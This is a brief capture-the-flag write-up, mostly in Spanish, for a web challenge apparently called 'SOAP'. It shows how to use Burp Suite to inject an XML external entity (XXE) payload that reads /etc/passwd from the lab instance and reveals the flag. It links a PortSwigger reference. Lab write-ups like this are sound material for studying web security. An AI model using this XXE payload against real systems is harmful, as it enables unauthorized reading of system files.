## Objetivo
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
## Solución

```
Para resolver este reto tendremos que usar Burp Suite
```

![SOAP 1](/imagenes/SOAP(1).png)

```
Lo mandamos al repeater y ahi hacemos lo siguiente:

Metemos la linea: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

y cambiamos 1 por &xxe;1 :

<data>
	<ID>
	&xxe;1
	</ID>
</data>
```

![SOAP 2](/imagenes/SOAP(2).png)

```
Como resultado nos dara el contenido del /etc/passwd y con el la flag
```

![SOAP 3](/imagenes/SOAP(3).png)

## Notas adicionales
## Referencias
[XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)